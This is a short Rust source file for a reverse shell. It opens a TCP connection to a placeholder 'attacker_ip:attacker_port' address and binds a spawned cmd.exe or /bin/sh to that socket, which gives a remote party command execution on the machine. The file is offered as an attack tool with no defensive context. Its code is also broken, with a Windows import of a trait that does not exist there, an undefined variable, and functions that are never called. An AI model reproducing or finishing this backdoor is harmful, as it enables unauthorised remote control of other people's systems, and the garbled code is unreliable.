// * Imports for network connectivity

use std::net::TcpStream;
use std::os::windows::io::AsRawFd;
use std::process::{Command, Stdio};


fn main(){

    fn gatherer(location: i32, port: i32) -> (i32, i32) {
        (ip, port)
    }
    fn connector(location: i32, port: i32) {
        if let Ok(stream) = TcpStream::connect("attacker_ip:attacker_port") {
            let shell = if cfg!(target_os = "windows") {
                "cmd.exe"
            }
            else {
                "/bin/sh"
            };
            let fd = stream.as_raw_fd();
            Command::new(shell)
                .stdin(unsafe{Stdio::from_raw_fd(fd)})
                .stdout(unsafe{Stdio::from_raw_fd(fd)})
                .stderr(unsafe{Stdio::from_raw_fd(fd)})
                .spawn()
                .expect("Failed to spawn shell")
        };
    }

    /*
        ! IF-Ctrl checks if TCPStream executes and returns 0
        ! Checks shell type. PS/BASH
    */
};